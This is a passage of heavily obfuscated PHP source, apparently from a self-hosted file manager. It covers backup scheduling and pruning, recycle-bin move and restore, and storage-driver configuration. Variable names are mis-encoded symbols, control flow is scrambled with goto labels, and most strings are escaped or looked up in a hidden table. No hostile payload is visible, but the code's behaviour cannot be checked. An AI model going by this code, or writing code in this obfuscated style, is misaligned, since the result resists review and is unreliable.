Fæ…„⁄õãâ; a≤ôÙºâ¬: $this->checkStore($aåïÈê…⁄§[$dó¥„©©ë·[691]]); $aç∂ã…ëìû = array($dó¥„©©ë·[691] => $aåïÈê…⁄§[$dó¥„©©ë·[691]], $dó¥„©©ë·[28] => self::$name, $dó¥„©©ë·[689] => 0, $dó¥„©©ë·[692] => $aåïÈê…⁄§[$dó¥„©©ë·[692]], $dó¥„©©ë·[281] => array($dó¥„©©ë·[693] => array($dó¥„©©ë·[689] => 0), $dó¥„©©ë·[694] => array($dó¥„©©ë·[689] => 0, $dó¥„©©ë·[695] => 0, $dó¥„©©ë·[696] => 0, $dó¥„©©ë·[29] => $dó¥„©©ë·[33]), $dó¥„©©ë·[697] => array($dó¥„©©ë·[689] => 0, $dó¥„©©ë·[695] => 0, $dó¥„©©ë·[696] => 0), $dó¥„©©ë·[167] => array($dó¥„©©ë·[689] => 0, $dó¥„©©ë·[698] => 0, $dó¥„©©ë·[699] => 0, $dó¥„©©ë·[700] => 0, $dó¥„©©ë·[701] => 0, $dó¥„©©ë·[419] => $cáÆÒ‘πƒ)), $dó¥„©©ë·[702] => time(), $dó¥„©©ë·[703] => 0); $DÆÑŒæ‹ÜÓ = Model($dó¥„©©ë·[688])->insert($aç∂ã…ëìû); goto eåË¶∫©‡æ; Fæ…„⁄õãâ: } private function checkStore($aë¯ééèÖí) { $föò‘ßƒ∫Õ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÒú˜∆æïΩ = Model($föò‘ßƒ∫Õ[704])->listData($aë¯ééèÖí); Model($föò‘ßƒ∫Õ[704])->checkConfig($DÒú˜∆æïΩ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][688])->findByName(self::$name); } return self::$option; } public static function set($døèÑ™©©Ñ) { $FåÂß’‰≠’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BŸ‡ã„å·∫ = self::get(); foreach ($døèÑ™©©Ñ as $E≤‘¡∏õçÈ => $aÊƒà“‚ôÉ) { $cµ¬œ…õ≈é = explode($FåÂß’‰≠’[91], $E≤‘¡∏õçÈ); $eœπò√—ëﬁ = count($cµ¬œ…õ≈é); switch ($eœπò√—ëﬁ) { case 1: $BŸ‡ã„å·∫[$cµ¬œ…õ≈é[0]] = $aÊƒà“‚ôÉ; break; case 2: $BŸ‡ã„å·∫[$cµ¬œ…õ≈é[0]][$cµ¬œ…õ≈é[1]] = $aÊƒà“‚ôÉ; break; case 3: $BŸ‡ã„å·∫[$cµ¬œ…õ≈é[0]][$cµ¬œ…õ≈é[1]][$cµ¬œ…õ≈é[2]] = $aÊƒà“‚ôÉ; break; } } Model($FåÂß’‰≠’[688])->update($BŸ‡ã„å·∫[$FåÂß’‰≠’[367]], $BŸ‡ã„å·∫); self::$option = $BŸ‡ã„å·∫; return self::$option; } public function keep() { $B•©‡Îóä¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dí€˘àÔ«€ = self::get(); if ($dí€˘àÔ«€[$B•©‡Îóä¥[281]][$B•©‡Îóä¥[693]][$B•©‡Îóä¥[689]] == $B•©‡Îóä¥[83]) { return; } $this->backupKeep($dí€˘àÔ«€); self::set(array($B•©‡Îóä¥[705] => 1)); } private function backupKeep($bù≈Êôá§“) { goto FÓíë∑⁄é∏; DÎ«∫≈§¯ø: $aÈç∫Æ‰ıã = 0; $aåÉ¯Ó¥≈¡ = array(); foreach ($E™ËÍï«åç as $c‰’ÍÑóò¨) { if ($aÈç∫Æ‰ıã >= 7) { break; } $aåÉ¯Ó¥≈¡[] = $c‰’ÍÑóò¨[$E‹ó›ÔóÙ¥[28]]; $aÈç∫Æ‰ıã++; } goto C–éÔë¿≠´; C–éÔë¿≠´: for ($aÈç∫Æ‰ıã = 0; $aÈç∫Æ‰ıã < 12; $aÈç∫Æ‰ıã++) { $aåÉ¯Ó¥≈¡[] = date($E‹ó›ÔóÙ¥[706], strtotime("\x2d{$aÈç∫Æ‰ıã}\x20\x6d\157\156\x74\150\x73")); } $aåÉ¯Ó¥≈¡ = array_unique($aåÉ¯Ó¥≈¡); foreach ($E™ËÍï«åç as $c‰’ÍÑóò¨) { if (!empty($c‰’ÍÑóò¨[$E‹ó›ÔóÙ¥[28]]) && in_array($c‰’ÍÑóò¨[$E‹ó›ÔóÙ¥[28]], $aåÉ¯Ó¥≈¡)) { continue; } Model($E‹ó›ÔóÙ¥[688])->remove($c‰’ÍÑóò¨[$E‹ó›ÔóÙ¥[367]]); $d®¢‡ÊŒë‘ = "\173\x69\x6f\72{$bù≈Êôá§“[$E‹ó›ÔóÙ¥[691]]}\x7d\x2f\144\141\164\141\x62\141\163\x65\57\142\x61\143\153\x75\160\x5f{$c‰’ÍÑóò¨[$E‹ó›ÔóÙ¥[28]]}"; IO::remove($d®¢‡ÊŒë‘, !1); } goto C≥∫ﬂå´ù’; FÓíë∑⁄é∏: $E‹ó›ÔóÙ¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E™ËÍï«åç = Model($E‹ó›ÔóÙ¥[688])->listData(); if (empty($E™ËÍï«åç)) { return; } goto DÎ«∫≈§¯ø; C≥∫ﬂå´ù’: } public function db() { goto BÓÈ•à øå; dåŒ–˜ó◊‹: return !0; goto bøﬂÎ—‹€ù; BÓÈ•à øå: $eú≠ﬂÉòÛ… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f««Ø⁄Ÿêµ = self::get(); if ($f««Ø⁄Ÿêµ[$eú≠ﬂÉòÛ…[281]][$eú≠ﬂÉòÛ…[694]][$eú≠ﬂÉòÛ…[689]] == $eú≠ﬂÉòÛ…[83]) { return !0; } goto BÔˆàœ›ñΩ; BÔˆàœ›ñΩ: $bÇº∆⁄√•ü = new BackupDb(); if (!$bÇº∆⁄√•ü->index()) { return !1; } self::set(array($eú≠ﬂÉòÛ…[707] => 1)); goto dåŒ–˜ó◊‹; bøﬂÎ—‹€ù: } public function dbFile() { goto D£ ¬Ô“¿ù; f„’êí∞ﬂ—: $c‹≤ÉÌã◊€ = new BackupDbFile(); if (!$c‹≤ÉÌã◊€->index()) { return !1; } self::set(array($cÎÿáè”£Ñ[708] => 1)); goto D∞≤íÎÉﬂŒ; D£ ¬Ô“¿ù: $cÎÿáè”£Ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AøÕº¥∆µ√ = self::get(); if ($AøÕº¥∆µ√[$cÎÿáè”£Ñ[281]][$cÎÿáè”£Ñ[697]][$cÎÿáè”£Ñ[689]] == $cÎÿáè”£Ñ[83]) { return !0; } goto f„’êí∞ﬂ—; D∞≤íÎÉﬂŒ: return !0; goto dŒÜ≠ÿƒíœ; dŒÜ≠ÿƒíœ: } public function file() { $d∆ºç«∑≤  =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f¶’ÍèÉ„É = self::get(); if ($f¶’ÍèÉ„É[$d∆ºç«∑≤ [281]][$d∆ºç«∑≤ [167]][$d∆ºç«∑≤ [689]] == $d∆ºç«∑≤ [83]) { return !0; } if (!isset($f¶’ÍèÉ„É[$d∆ºç«∑≤ [692]]) || $f¶’ÍèÉ„É[$d∆ºç«∑≤ [692]] == $d∆ºç«∑≤ [468]) { $bŒàÙﬁ⁄Ø¿ = new BackupFile(); if (!$bŒàÙﬁ⁄Ø¿->index()) { return !1; } } self::set(array($d∆ºç«∑≤ [709] => 1, $d∆ºç«∑≤ [689] => 1)); return !0; } } $aå∞û°ø…• = LIB_DIR . $_SERVER[Ä¿¡‡öóµŸﬂ‡][710]; $b≤∆—⁄˘‚€ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][711]; goto f£äÌﬁˆü‚; BçãäΩí´Œ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\143\145\137\162\145\143\x79\x63\154\x65"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\124\x69\x6d\x65", "\x74\151\155\x65", "\151\x6e\163\x65\162\x74", "\x66\165\x6e\x63\x74\151\157\x6e")); public function listData($E≥¡àª∫ΩØ = false) { $Fá·∏¡±∑ê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E≥¡àª∫ΩØ = $E≥¡àª∫ΩØ ? $E≥¡àª∫ΩØ : USER_ID; $F—ıìé¶°π = $this->where(array($Fá·∏¡±∑ê[1429] => $E≥¡àª∫ΩØ))->select(); return array_to_keyvalue($F—ıìé¶°π, $Fá·∏¡±∑ê[33], $Fá·∏¡±∑ê[369]); } public function moveToRecycle($eìôÂåìﬂã) { goto cá∂∆›—ã; F‡à·êïﬂ‘: $this->recycleMove($eìôÂåìﬂã, 1); if ($cÏ•“‘ƒÀ—[$bú◊ˆØ⁄Öú[370]] == $bú◊ˆØ⁄Öú[83]) { $F‡ı≈œ†¡≤ = array($bú◊ˆØ⁄Öú[525] => array($bú◊ˆØ⁄Öú[483], $cÏ•“‘ƒÀ—[$bú◊ˆØ⁄Öú[459]] . $eìôÂåìﬂã . $bú◊ˆØ⁄Öú[484])); $Aûºß•é∞Ñ->where($F‡ı≈œ†¡≤)->setField($bú◊ˆØ⁄Öú[397], 1); } goto AŸ√ÇŒµŸ¯; cá∂∆›—ã: $bú◊ˆØ⁄Öú =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aûºß•é∞Ñ = Model($bú◊ˆØ⁄Öú[1121]); $cÏ•“‘ƒÀ— = $Aûºß•é∞Ñ->sourceInfo($eìôÂåìﬂã); goto dâ÷ä∑©®Õ; dâ÷ä∑©®Õ: if (!$cÏ•“‘ƒÀ— || $cÏ•“‘ƒÀ—[$bú◊ˆØ⁄Öú[397]] == $bú◊ˆØ⁄Öú[83]) { return; } $D√œÙÿœ¶• = array($bú◊ˆØ⁄Öú[383] => $eìôÂåìﬂã, $bú◊ˆØ⁄Öú[1429] => USER_ID, $bú◊ˆØ⁄Öú[521] => $cÏ•“‘ƒÀ—[$bú◊ˆØ⁄Öú[371]], $bú◊ˆØ⁄Öú[522] => $cÏ•“‘ƒÀ—[$bú◊ˆØ⁄Öú[456]], $bú◊ˆØ⁄Öú[525] => $cÏ•“‘ƒÀ—[$bú◊ˆØ⁄Öú[459]]); $this->add($D√œÙÿœ¶•); goto F‡à·êïﬂ‘; AŸ√ÇŒµŸ¯: } public function clear() { $this->remove(!1); } public function remove($Däíﬁπ®≥¬ = false) { goto e»±Èï—ßé; eÎ‹¥¥√ï‡: foreach ($FÒÙŸˆÍ†∞ as $BÆá√óºƒÒ) { $f‹›ÔÓÂµÿ->targetSpaceUpdate($BÆá√óºƒÒ[$D≠ÃÎüñœö[371]], $BÆá√óºƒÒ[$D≠ÃÎüñœö[456]]); } goto f‘¯Ú ü°Ï; e»±Èï—ßé: $D≠ÃÎüñœö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f‹›ÔÓÂµÿ = Model($D≠ÃÎüñœö[1121]); $B‹ï…∫∆Œ√ = $this->listData(); goto Bﬂ‹ÿçåÂ; Bﬂ‹ÿçåÂ: $Däíﬁπ®≥¬ = $Däíﬁπ®≥¬ === !1 ? !1 : $Däíﬁπ®≥¬; $FÒÙŸˆÍ†∞ = array(); foreach ($B‹ï…∫∆Œ√ as $fÓÍÕ¢…–„) { if ($Däíﬁπ®≥¬ != !1 && !in_array($fÓÍÕ¢…–„, $Däíﬁπ®≥¬)) { continue; } $f‹›ÔÓÂµÿ->remove($fÓÍÕ¢…–„, !1); $dﬁÙ≈ØÖ∞ã = $this->where(array($D≠ÃÎüñœö[369] => $fÓÍÕ¢…–„))->find(); $fπ∆åäÔç¬ = $dﬁÙ≈ØÖ∞ã[$D≠ÃÎüñœö[371]] . $D≠ÃÎüñœö[70] . $dﬁÙ≈ØÖ∞ã[$D≠ÃÎüñœö[456]]; $FÒÙŸˆÍ†∞[$fπ∆åäÔç¬] = array($D≠ÃÎüñœö[521] => $dﬁÙ≈ØÖ∞ã[$D≠ÃÎüñœö[371]], $D≠ÃÎüñœö[456] => $dﬁÙ≈ØÖ∞ã[$D≠ÃÎüñœö[456]]); $this->where(array($D≠ÃÎüñœö[369] => $fÓÍÕ¢…–„))->delete(); } goto eÎ‹¥¥√ï‡; f‘¯Ú ü°Ï: } public function restore($f÷∞´Ëòºœ = false) { goto Fâáû◊Òìﬂ; Fâáû◊Òìﬂ: $EØ”ú›‹Ñ‰ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÖ◊Ô›Íó∞ = Model($EØ”ú›‹Ñ‰[1121]); $C‹ÈûÉ√ëæ = $this->listData(); goto AÆå¯¿≥ûµ; AÆå¯¿≥ûµ: $f÷∞´Ëòºœ = $f÷∞´Ëòºœ == !1 ? !1 : $f÷∞´Ëòºœ; if (!$C‹ÈûÉ√ëæ) { return !0; } $bîåÜÇ¨¯Ã = array(); goto bëËÇƒÒºõ; bëËÇƒÒºõ: foreach ($C‹ÈûÉ√ëæ as $bóç…òŸË—) { goto fàÃë›ÒﬁÌ; C–Ω«Ω‡∂á: if ($c“ßé∆¨úÛ[$EØ”ú›‹Ñ‰[370]] == $EØ”ú›‹Ñ‰[83]) { $FÀ˘é¯ªÿ¢ = array($EØ”ú›‹Ñ‰[525] => array($EØ”ú›‹Ñ‰[483], $c“ßé∆¨úÛ[$EØ”ú›‹Ñ‰[459]] . $bóç…òŸË— . $EØ”ú›‹Ñ‰[484])); $FÖ◊Ô›Íó∞->where($FÀ˘é¯ªÿ¢)->setField($EØ”ú›‹Ñ‰[397], 0); $this->restoreFolderChildren($bóç…òŸË—, $C‹ÈûÉ√ëæ); } $this->where(array($EØ”ú›‹Ñ‰[369] => $bóç…òŸË—))->delete(); $FÖ◊Ô›Íó∞->folderSizeReset($c“ßé∆¨úÛ[$EØ”ú›‹Ñ‰[461]]); goto FâÙËæ∑åΩ; FâÙËæ∑åΩ: $bîåÜÇ¨¯Ã[] = $c“ßé∆¨úÛ[$EØ”ú›‹Ñ‰[461]]; if ($c“ßé∆¨úÛ[$EØ”ú›‹Ñ‰[370]] == $EØ”ú›‹Ñ‰[83]) { $bîåÜÇ¨¯Ã[] = $bóç…òŸË—; } $FÖ◊Ô›Íó∞->lockMoveEnd($bóç…òŸË—); goto Eß◊ÀÔ·®Ü; c±ƒâﬂ≥Õ†: if ($açÆÇıèπÑ[$EØ”ú›‹Ñ‰[397]] == $EØ”ú›‹Ñ‰[83]) { continue; } $FÖ◊Ô›Íó∞->lockMoveStart($bóç…òŸË—); $this->recycleMove($bóç…òŸË—, 0); goto C–Ω«Ω‡∂á; fàÃë›ÒﬁÌ: if ($f÷∞´Ëòºœ != !1 && !in_array($bóç…òŸË—, $f÷∞´Ëòºœ)) { continue; } $c“ßé∆¨úÛ = $FÖ◊Ô›Íó∞->sourceInfo($bóç…òŸË—); $açÆÇıèπÑ = $FÖ◊Ô›Íó∞->sourceInfo($c“ßé∆¨úÛ[$EØ”ú›‹Ñ‰[461]]); goto c±ƒâﬂ≥Õ†; Eß◊ÀÔ·®Ü: } $FÖ◊Ô›Íó∞->updateModifyTime($bîåÜÇ¨¯Ã); goto dõáÃÔ—ã÷; dõáÃÔ—ã÷: } private function restoreFolderChildren($bÔ”é¶ÆÌù, $CŸÍµπΩªÛ) { goto d÷ô»ÿ ≈©; F‘£Üõ¶ôµ: foreach ($CŸÍµπΩªÛ as $f”ÚãÇê‰Ÿ) { if ($f”ÚãÇê‰Ÿ == $bÔ”é¶ÆÌù) { continue; } if (!$b‘‚õ¯ôÑª->isParentOf($bÔ”é¶ÆÌù, $f”ÚãÇê‰Ÿ)) { continue; } $A⁄µø…¯èÌ = $b‘‚õ¯ôÑª->sourceInfo($f”ÚãÇê‰Ÿ); if ($A⁄µø…¯èÌ[$e«Ù™õ†¨π[370]] == $e«Ù™õ†¨π[83]) { $fçÂÙØï≈≥[] = array($e«Ù™õ†¨π[525] => array($e«Ù™õ†¨π[483], $A⁄µø…¯èÌ[$e«Ù™õ†¨π[459]] . $f”ÚãÇê‰Ÿ . $e«Ù™õ†¨π[484])); } else { $fçÂÙØï≈≥[$e«Ù™õ†¨π[369]][1][] = $f”ÚãÇê‰Ÿ; } } if (!$fçÂÙØï≈≥[$e«Ù™õ†¨π[369]][1]) { unset($fçÂÙØï≈≥[$e«Ù™õ†¨π[369]]); } if (!$fçÂÙØï≈≥) { return; } goto fªòÆ≥¥ïá; fªòÆ≥¥ïá: $fçÂÙØï≈≥[$e«Ù™õ†¨π[369]][1] = array_unique($fçÂÙØï≈≥[$e«Ù™õ†¨π[369]][1]); $fçÂÙØï≈≥[$e«Ù™õ†¨π[918]] = $e«Ù™õ†¨π[2187]; $b‘‚õ¯ôÑª->where($fçÂÙØï≈≥)->setField($e«Ù™õ†¨π[397], 1); goto bœ÷∆áö≠ê; d÷ô»ÿ ≈©: $e«Ù™õ†¨π =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b‘‚õ¯ôÑª = Model($e«Ù™õ†¨π[1121]); $fçÂÙØï≈≥ = array($e«Ù™õ†¨π[369] => array($e«Ù™õ†¨π[7], array())); goto F‘£Üõ¶ôµ; bœ÷∆áö≠ê: } private function recycleMove($eΩ§ŒÔÃ⁄ü, $dÈ∑ú¨Ω¨± = 1) { $fµ»Í•®ÜÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÀ≥˘…–¶◊ = Model($fµ»Í•®ÜÖ[1121]); $aà–ƒâÎÔÆ = Model($fµ»Í•®ÜÖ[2365]); $bÒƒªΩéç≥ = array($fµ»Í•®ÜÖ[369] => $eΩ§ŒÔÃ⁄ü); if ($dÈ∑ú¨Ω¨±) { $dÀ≥˘…–¶◊->where($bÒƒªΩéç≥)->setField($fµ»Í•®ÜÖ[397], 1); $aà–ƒâÎÔÆ->eventRecycle($eΩ§ŒÔÃ⁄ü, $fµ»Í•®ÜÖ[2366]); } else { $dÆÓÕÀˆÙñ = $dÀ≥˘…–¶◊->where($bÒƒªΩéç≥)->find(); $AÁ€¡∆‡⁄∑ = $dÆÓÕÀˆÙñ[$fµ»Í•®ÜÖ[370]] == $fµ»Í•®ÜÖ[83]; $AÿÚÓÖãÇ® = $dÀ≥˘…–¶◊->fileNameAuto($dÆÓÕÀˆÙñ[$fµ»Í•®ÜÖ[461]], $dÆÓÕÀˆÙñ[$fµ»Í•®ÜÖ[28]], REPEAT_RENAME_FOLDER, $AÁ€¡∆‡⁄∑); if ($AÿÚÓÖãÇ® != $dÆÓÕÀˆÙñ[$fµ»Í•®ÜÖ[28]]) { $dÀ≥˘…–¶◊->rename($eΩ§ŒÔÃ⁄ü, $AÿÚÓÖãÇ®); } $dÀ≥˘…–¶◊->where($bÒƒªΩéç≥)->setField($fµ»Í•®ÜÖ[397], 0); $aà–ƒâÎÔÆ->eventRecycle($eΩ§ŒÔÃ⁄ü, $fµ»Í•®ÜÖ[2367]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\x73\164\157\x72\141\x67\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\151\x7a\x65\x4d\x61\x78", "\x73\171\x73\164\x65\155", "\144\x65\146\141\x75\x6c\164", "\x64\x72\151\166\x65\162", "\x63\157\156\x66\x69\147"); public function listData($Aä±‹õ‹Ôí = false, $dˆ⁄ﬂ¯ä∏Ï = "\155\157\x64\151\146\171\x54\151\155\145", $d–Ü™ºô√› = false) { goto DÒﬂÖ¯ÇÊí; b˜Î◊≈ÓÛì: return $bñ»Áïêæ∆; goto CªËÚ¯ÔÙÉ; d¢»‡Öãäò: foreach ($bñ»Áïêæ∆ as $bïò·Ï‘∆ù => $Cûî‘¶ß‡ò) { unset($bñ»Áïêæ∆[$bïò·Ï‘∆ù][$eµä®ÉΩ◊[6]]); $bñ»Áïêæ∆[$bïò·Ï‘∆ù][$eµä®ÉΩ◊[2092]] = 0; } $aíëÓ„€òÉ = array_to_keyvalue($bñ»Áïêæ∆, $eµä®ÉΩ◊[33], $eµä®ÉΩ◊[367]); $this->_listAppendSize($bñ»Áïêæ∆, $aíëÓ„€òÉ); goto b˜Î◊≈ÓÛì; DÒﬂÖ¯ÇÊí: $eµä®ÉΩ◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bñ»Áïêæ∆ = parent::listData($Aä±‹õ‹Ôí, $dˆ⁄ﬂ¯ä∏Ï, $d–Ü™ºô√›); if ($Aä±‹õ‹Ôí) { return $bñ»Áïêæ∆; } goto d¢»‡Öãäò; CªËÚ¯ÔÙÉ: } public function _listAppendSize(&$a„ÀõÙ·›, $b∆Óı˘ﬁ‡¥) { $e˜«óŒƒ∂™ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$b∆Óı˘ﬁ‡¥) { return; } $B§çüˆ≤ƒÇ = $e˜«óŒƒ∂™[2368] . implode($e˜«óŒƒ∂™[47], $b∆Óı˘ﬁ‡¥) . $e˜«óŒƒ∂™[2369]; $fÇÁÁπÜ‰Æ = Model($e˜«óŒƒ∂™[727])->query($B§çüˆ≤ƒÇ); $fÇÁÁπÜ‰Æ = array_to_keyvalue($fÇÁÁπÜ‰Æ, $e˜«óŒƒ∂™[367], $e˜«óŒƒ∂™[77]); foreach ($a„ÀõÙ·› as $eﬂçÇÜŒ≥É => $e∂ﬂ»ƒÉêÊ) { $a„ÀõÙ·›[$eﬂçÇÜŒ≥É][$e˜«óŒƒ∂™[2092]] = isset($fÇÁÁπÜ‰Æ[$e∂ﬂ»ƒÉêÊ[$e˜«óŒƒ∂™[367]]]) ? $fÇÁÁπÜ‰Æ[$e∂ﬂ»ƒÉêÊ[$e˜«óŒƒ∂™[367]]] : 0; } } public function getConfig($dÂ∫¬Ö‰ºœ) { $cäÎÑîÁ¨â = parent::listData($dÂ∫¬Ö‰ºœ); return json_decode($cäÎÑîÁ¨â[$_SERVER[Ä¿¡‡öóµŸﬂ‡][6]], !0); } public function update($B˘äãÇèôÇ, $a„£ÛÃ¬ã¿) { goto C¿≈€∑∆è; dåµÌ¬û∞§: if (isset($f‰‰†Æ∆õÑ[$FöÔ˜»ÇÙî]) && $f‰‰†Æ∆õÑ[$FöÔ˜»ÇÙî][$Bƒ¨¨çﬂòÖ[367]] != $B˘äãÇèôÇ) { return !1; } if (isset($a„£ÛÃ¬ã¿[$Bƒ¨¨çﬂòÖ[2370]]) && $a„£ÛÃ¬ã¿[$Bƒ¨¨çﬂòÖ[2370]] == $Bƒ¨¨çﬂòÖ[83]) { $this->checkConfig($a„£ÛÃ¬ã¿); } unset($a„£ÛÃ¬ã¿[$Bƒ¨¨çﬂòÖ[2370]]); goto B‰¶úéõÌú; B‰¶úéõÌú: $DÓÍƒ·èÑê = parent::update($B˘äãÇèôÇ, $a„£ÛÃ¬ã¿); if ($DÓÍƒ·èÑê && $a„£ÛÃ¬ã¿[$Bƒ¨¨çﬂòÖ[34]]) { foreach ($f‰‰†Æ∆õÑ as $dûÌá“Øä) { if ($dûÌá“Øä[$Bƒ¨¨çﬂòÖ[34]] && $dûÌá“Øä[$Bƒ¨¨çﬂòÖ[367]] != $B˘äãÇèôÇ) { parent::update($dûÌá“Øä[$Bƒ¨¨çﬂòÖ[367]], array($Bƒ¨¨çﬂòÖ[34] => 0)); } } } return $DÓÍƒ·èÑê; goto f”œìá•«À; C¿≈€∑∆è: $Bƒ¨¨çﬂòÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FöÔ˜»ÇÙî = $a„£ÛÃ¬ã¿[$Bƒ¨¨çﬂòÖ[28]]; $f‰‰†Æ∆õÑ = array_to_keyvalue(parent::listData(), $Bƒ¨¨çﬂòÖ[28]); goto dåµÌ¬û∞§; f”œìá•«À: } public function add($añé †ÀŒÑ) { goto DÖ´©Üâû”; DÖ´©Üâû”: $cß¡÷ÙÉ≥„ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eæ˘ù»Ãó∂ = array_to_keyvalue(parent::listData(), $cß¡÷ÙÉ≥„[28]); if (isset($eæ˘ù»Ãó∂[$añé †ÀŒÑ[$cß¡÷ÙÉ≥„[28]]])) { return !1; } goto F°ßõìÜ‘›; cêèÉ¬¨ØÒ: return $Cñîé›êÑ•; goto Eçë¢ÿÊÆﬂ; F°ßõìÜ‘›: $this->checkConfig($añé †ÀŒÑ); $Cñîé›êÑ• = parent::insert($añé †ÀŒÑ); if ($Cñîé›êÑ• && $añé †ÀŒÑ[$cß¡÷ÙÉ≥„[34]]) { foreach ($eæ˘ù»Ãó∂ as $Bß∂ÿû»¿‡) { if ($Bß∂ÿû»¿‡[$cß¡÷ÙÉ≥„[34]]) { parent::update($Bß∂ÿû»¿‡[$cß¡÷ÙÉ≥„[367]], array($cß¡÷ÙÉ≥„[34] => 0)); } } } goto cêèÉ¬¨ØÒ; Eçë¢ÿÊÆﬂ: } public function checkConfig(&$d≈“üµÌÊÚ) { goto f—ü§©Ω⁄ ; f—ü§©Ω⁄ : $EÁ⁄é∂ŒâÔ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F ß©‡¨ƒ‚ = strtolower($d≈“üµÌÊÚ[$EÁ⁄é∂ŒâÔ[90]]); $AÉ™›õ˘Æ = json_decode($d≈“üµÌÊÚ[$EÁ⁄é∂ŒâÔ[6]], !0); goto BÈ≈Áí∞Ïü; E–÷Ñ∏πÖó: $bååŒ·Î’É = $EÁ⁄é∂ŒâÔ[71] . $CÍ´†ÍêÛù; $D˜Ù≥ÍçÜ± = new $bååŒ·Î’É($AÉ™›õ˘Æ); if (in_array($F ß©‡¨ƒ‚, $D˜Ù≥ÍçÜ±->objectDriver)) { if (!$D˜Ù≥ÍçÜ±->isBucketCors() && !$D˜Ù≥ÍçÜ±->setBucketCors()) { $dÓÈ≈È»¶á = LNG($EÁ⁄é∂ŒâÔ[2372]); $dÓÈ≈È»¶á .= $EÁ⁄é∂ŒâÔ[2373] . LNG($EÁ⁄é∂ŒâÔ[2374]); show_json($dÓÈ≈È»¶á, !1); } } goto Fœé¶÷ù§â; Fœé¶÷ù§â: $eπÙ–‘ΩéÉ = rtrim($AÉ™›õ˘Æ[$EÁ⁄é∂ŒâÔ[1028]], $EÁ⁄é∂ŒâÔ[8]) . $EÁ⁄é∂ŒâÔ[8]; $b’ì·ÈÏÜÌ = $D˜Ù≥ÍçÜ±->getPath($eπÙ–‘ΩéÉ . $EÁ⁄é∂ŒâÔ[1987]); if (!$D˜Ù≥ÍçÜ±->mkfile($b’ì·ÈÏÜÌ)) { show_json(LNG($EÁ⁄é∂ŒâÔ[2372]), !1); } goto FÉÛÁ·Á§Á; FÉÛÁ·Á§Á: $AÉ™›õ˘Æ[$EÁ⁄é∂ŒâÔ[1028]] = $eπÙ–‘ΩéÉ; $d≈“üµÌÊÚ[$EÁ⁄é∂ŒâÔ[6]] = json_encode($AÉ™›õ˘Æ); $d≈“üµÌÊÚ[$EÁ⁄é∂ŒâÔ[90]] = $CÍ´†ÍêÛù; goto f∑√∑µØ∏–; f∑√∑µØ∏–: return !0; goto eä∞ï´¨íè; BÈ≈Áí∞Ïü: foreach ($AÉ™›õ˘Æ as $DÇ™Üàâ´ê => $EÌ¥†á÷–¡) { $AÉ™›õ˘Æ[$DÇ™Üàâ´ê] = trim($EÌ¥†á÷–¡); } $AÉ™›õ˘Æ[$EÁ⁄é∂ŒâÔ[2371]] = rand_string(6); $CÍ´†ÍêÛù = $this->driverType($F ß©‡¨ƒ‚); goto E–÷Ñ∏πÖó; eä∞ï´¨íè: } private function driverType($Dûãòä≠àÃ) { $fŸ¿º€Ë‹á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÉ◊∞≈√ûŸ = array($fŸ¿º€Ë‹á[102] => $fŸ¿º€Ë‹á[2375], $fŸ¿º€Ë‹á[58] => $fŸ¿º€Ë‹á[2376], $fŸ¿º€Ë‹á[64] => $fŸ¿º€Ë‹á[2377]); if (isset($dÉ◊∞≈√ûŸ[$Dûãòä≠àÃ])) { return $dÉ◊∞≈√ûŸ[$Dûãòä≠àÃ]; } return strtoupper($Dûãòä≠àÃ); } public function driverListSystem() { $Cß°ô∏Õºı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÎ·õÒ€ÃŒ = parent::listData(); $AΩâîÕÃ»µ = array(); foreach ($cÎ·õÒ€ÃŒ as $aˆ·∏≈îÉ¶) { unset($aˆ·∏≈îÉ¶[$Cß°ô∏Õºı[187]], $aˆ·∏≈îÉ¶[$Cß°ô∏Õºı[107]]); $aˆ·∏≈îÉ¶[$Cß°ô∏Õºı[6]] = json_decode($aˆ·∏≈îÉ¶[$Cß°ô∏Õºı[6]], !0); $AΩâîÕÃ»µ[] = $aˆ·∏≈îÉ¶; } return $AΩâîÕÃ»µ; } public function defaultDriver() { $A⁄≤Ñﬁ ’Ü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A∞íﬂ≈é∂¿ = parent::listData(); $dòÓøöÂΩÑ = array_filter_by_field($A∞íﬂ≈é∂¿, $A⁄≤Ñﬁ ’Ü[34], 1); $dòÓøöÂΩÑ = $dòÓøöÂΩÑ[0]; if ($dòÓøöÂΩÑ) { $dòÓøöÂΩÑ[$A⁄≤Ñﬁ ’Ü[6]] = json_decode($dòÓøöÂΩÑ[$A⁄≤Ñﬁ ’Ü[6]], !0); } return $dòÓøöÂΩÑ; } public function driverInfo($eÈãÖ”Í◊¥) { $Fñï⁄£Ñı¿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÑÏ–ıı’€ = array_to_keyvalue(parent::listData(), $Fñï⁄£Ñı¿[367]); if (!isset($DÑÏ–ıı’€[$eÈãÖ”Í◊¥])) { return !1; } $D⁄‘·âï∏é = $DÑÏ–ıı’€[$eÈãÖ”Í◊¥]; 